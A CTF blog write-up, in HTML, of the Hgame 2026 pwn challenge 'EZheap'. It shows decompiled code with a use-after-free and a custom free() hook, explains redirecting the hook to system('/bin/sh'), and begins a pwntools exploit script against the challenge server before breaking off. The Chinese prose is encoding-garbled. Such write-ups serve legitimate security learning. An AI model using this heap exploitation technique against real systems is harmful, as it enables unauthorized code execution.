<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hgame2026 | X1z1çš„ä¸ªäººåšå®¢</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Hgame 2026ç¬¬ä¸€å‘¨çš„Hgame pwnçš„éƒ¨åˆ†é¢˜è§£ã€‚èŠ±äº†ä¸€å‘¨çš„å¤§éƒ¨åˆ†æ—¶é—´åœ¨å†™ã€‚ä¹Ÿç¡®å®éš¾åº¦å¾ˆé«˜ã€‚ä¸‡å¹¸çš„æ˜¯è¿˜å¥½æ²¡çˆ†é›¶ã€‚è¿˜æ˜¯éœ€è¦ä¸æ–­å­¦ä¹ çš„ã€‚ 1.EZheapçœŸçš„ezå—ï¼ŸğŸ˜‚å¿«è¢«è™å“­äº†ğŸ˜¢å…¶å®æ˜¯è‡ªå·±èœã€‚ 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const">
<meta property="og:type" content="website">
<meta property="og:title" content="Hgame2026">
<meta property="og:url" content="http://example.com/2026/02/07/Hgame2026/index.html">
<meta property="og:site_name" content="X1z1çš„ä¸ªäººåšå®¢">
<meta property="og:description" content="Hgame 2026ç¬¬ä¸€å‘¨çš„Hgame pwnçš„éƒ¨åˆ†é¢˜è§£ã€‚èŠ±äº†ä¸€å‘¨çš„å¤§éƒ¨åˆ†æ—¶é—´åœ¨å†™ã€‚ä¹Ÿç¡®å®éš¾åº¦å¾ˆé«˜ã€‚ä¸‡å¹¸çš„æ˜¯è¿˜å¥½æ²¡çˆ†é›¶ã€‚è¿˜æ˜¯éœ€è¦ä¸æ–­å­¦ä¹ çš„ã€‚ 1.EZheapçœŸçš„ezå—ï¼ŸğŸ˜‚å¿«è¢«è™å“­äº†ğŸ˜¢å…¶å®æ˜¯è‡ªå·±èœã€‚ 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/avatar.jpg">
<meta property="article:published_time" content="2026-02-07T14:17:15.000Z">
<meta property="article:modified_time" content="2026-02-07T15:45:58.306Z">
<meta property="article:author" content="xizi">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/02/07/Hgame2026/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"æœªæ‰¾åˆ°ç¬¦åˆæ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Hgame2026',
  isHighlightShrink: false,
  isToc: false,
  pageType: 'posts'
}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1çš„ä¸ªäººåšå®¢</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Hgame2026</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Hgame-2026"><a href="#Hgame-2026" class="headerlink" title="Hgame 2026"></a>Hgame 2026</h1><p>ç¬¬ä¸€å‘¨çš„Hgame pwnçš„éƒ¨åˆ†é¢˜è§£ã€‚èŠ±äº†ä¸€å‘¨çš„å¤§éƒ¨åˆ†æ—¶é—´åœ¨å†™ã€‚ä¹Ÿç¡®å®éš¾åº¦å¾ˆé«˜ã€‚ä¸‡å¹¸çš„æ˜¯è¿˜å¥½æ²¡çˆ†é›¶ã€‚è¿˜æ˜¯éœ€è¦ä¸æ–­å­¦ä¹ çš„ã€‚</p>
<h2 id="1-EZheap"><a href="#1-EZheap" class="headerlink" title="1.EZheap"></a>1.EZheap</h2><p>çœŸçš„ezå—ï¼ŸğŸ˜‚å¿«è¢«è™å“­äº†ğŸ˜¢å…¶å®æ˜¯è‡ªå·±èœã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+4h] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        gift();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç»å…¸çš„èœå•å‡½æ•°ã€‚ç„¶åè¿™é‡Œçš„deleteå‡½æ•°é‡Œå­˜åœ¨UAFæ¼æ´ã€‚ä¹Ÿæ˜¯æˆ‘ä»¬åé¢èƒ½å¤Ÿgetshellçš„å…³é”®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *mem; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mem = notes[index];</span><br><span class="line">    <span class="keyword">if</span> ( mem )</span><br><span class="line">      <span class="built_in">free</span>(mem);                                <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Page not found.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ï¼Œè¿™æ¬¡åšé¢˜è¿˜æé†’äº†æˆ‘ï¼Œåƒä¸‡ä¸è¦åˆ»æ¿å°è±¡ã€‚è¿›idaåˆ†æå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå‡ºé¢˜äººè‡ªå·±é‡å®šä¹‰äº†mallocï¼Œfreeå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½æŒ‰ç…§ptmalloc2å’Œglibcçš„æ–¹å¼æ¥ç†è§£å †å—çš„åˆ†é…ã€‚ä¼°è®¡è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½ä»gdbé‡ŒåŠ¨æ€è°ƒè¯•å †å—ã€‚ä¸è¿‡å¹¸å¥½ï¼Œåœ¨ä»£ç å®¡è®¡åˆ†æçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä»addå‡½æ•°é‡Œè¯»å‡ºã€‚æ•æ„Ÿçš„å‘ç°æˆ‘ä»¬æ‰€åˆ›ç«‹çš„å †å—çš„åœ°å€éƒ½è¢«å­˜å…¥äº†notes[]æ•°ç»„ã€‚è€Œä¸”notesåœ¨bssæ®µã€‚æ‰€ä»¥æˆ‘ä»¬ä»ç„¶å¯ä»¥è·Ÿè¸ªåˆ°æˆ‘ä»¬å †å—åˆ†é…çš„åœ°å€å’Œè¾“å…¥çš„æ•°æ®ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index_1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 index_2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( notes[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">    index_1 = index;</span><br><span class="line">    v1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">    index_2 = index;</span><br><span class="line">    size_1 = size;</span><br><span class="line">    notes[index_1] = v1;</span><br><span class="line">    note_size[index_2] = size_1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œè¿™é‡Œåº”è¯¥æ€ä¹ˆgetshellå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹å‡ºç¨‹åºç»™äº†ä¸€ä¸ªgiftå‡½æ•°ã€‚é‡Œé¢æ˜¯å¾€hookçš„ä½ç½®å­˜å…¥ä¸€ä¸ªåœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;give me a hook\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;hook) &lt;= <span class="number">0</span> )  <span class="comment">// è¾“å…¥</span></span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶æˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹é‡å®šä¹‰çš„freeå‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">free</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">  malloc_chunk *p; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  malloc_chunk *p_1; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  mchunkptr fd; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( hook )</span><br><span class="line">  &#123;</span><br><span class="line">    hook(mem);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( mem )</span><br><span class="line">  &#123;</span><br><span class="line">    p = (malloc_chunk *)((<span class="type">char</span> *)mem - <span class="number">16</span>);</span><br><span class="line">    v2 = *((_QWORD *)mem - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L;</span><br><span class="line">    p_1 = (malloc_chunk *)((<span class="type">char</span> *)mem + v2 - <span class="number">16</span>);</span><br><span class="line">    v4 = p_1-&gt;mchunk_size &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( (*((_QWORD *)mem - <span class="number">1</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *((_QWORD *)mem - <span class="number">2</span>);</span><br><span class="line">      p = (malloc_chunk *)((<span class="type">char</span> *)p - v5);</span><br><span class="line">      v2 += v5;</span><br><span class="line">      <span class="keyword">if</span> ( (p-&gt;mchunk_size &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L) != v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Libc : %s\n&quot;</span>, <span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      unlink_chunk(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( main_arena.top == p_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      main_arena.top = p;</span><br><span class="line">      p-&gt;mchunk_size = (v4 + v2) | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (*((_BYTE *)&amp;p_1-&gt;mchunk_size + v4) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        p_1-&gt;mchunk_size &amp;= ~<span class="number">1uLL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 += v4;</span><br><span class="line">        unlink_chunk(p_1);</span><br><span class="line">      &#125;</span><br><span class="line">      fd = main_arena.bins[<span class="number">0</span>];</span><br><span class="line">      main_arena.bins[<span class="number">0</span>] = p;</span><br><span class="line">      p-&gt;bk = (malloc_chunk *)&amp;completed_0;</span><br><span class="line">      p-&gt;fd = fd;</span><br><span class="line">      fd-&gt;bk = p;</span><br><span class="line">      p-&gt;mchunk_size = v2 | <span class="number">1</span>;</span><br><span class="line">      *(INTERNAL_SIZE_T *)((<span class="type">char</span> *)&amp;p-&gt;mchunk_prev_size + v2) = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯´å®è¯ï¼Œçœ‹åˆ°è¿™ä¹ˆå¤§ä¸€ä¸²æˆ‘æ˜¯æœ‰ç‚¹å¤´ç–¼çš„ã€‚åé¢çš„å“ªäº›å…¶å®æˆ‘ä¹Ÿæ²¡æœ‰å®Œå…¨çœ‹æ‡‚ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥çœ‹å‰é¢å¾ˆå…³é”®çš„ã€‚ä¼šåˆ¤æ–­hookæ˜¯å¦ä¸º0ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬æ˜¯å¦æœ‰å¾€hookå¤„å¡«å…¥æŸäº›åœ°å€ã€‚å¦‚æœå¡«å…¥äº†ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨hookå¤„åœ°å€ï¼Œç„¶åå†æŠŠæˆ‘ä»¬è¦freeæ‰çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ ç»™hookã€‚é‚£ä¹ˆæ•é”çš„æˆ‘ä»¬è‚¯å®šèƒ½å¯Ÿè§‰çš„ã€‚å¦‚æœæ­¤æ—¶æˆ‘ä»¬èƒ½æŠŠhookå¤„çš„å†…å®¹å†™ä¸ºsystemçš„åœ°å€ï¼Œå¹¶ä¸”åˆ›é€ ä¸€ä¸ªå†™æœ‰&#x2F;bin&#x2F;sh\x00çš„å †å—ï¼Œä½œä¸ºå‚æ•°ä¼ ç»™freeã€‚å°±å¯ä»¥æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;sh\x00â€™)ä»è€Œcat flagã€‚</p>
<p>ä¸‹é¢ç»™å‡ºexpã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;cloud-middle.hgame.vidar.club&#x27;</span>,<span class="number">31411</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span 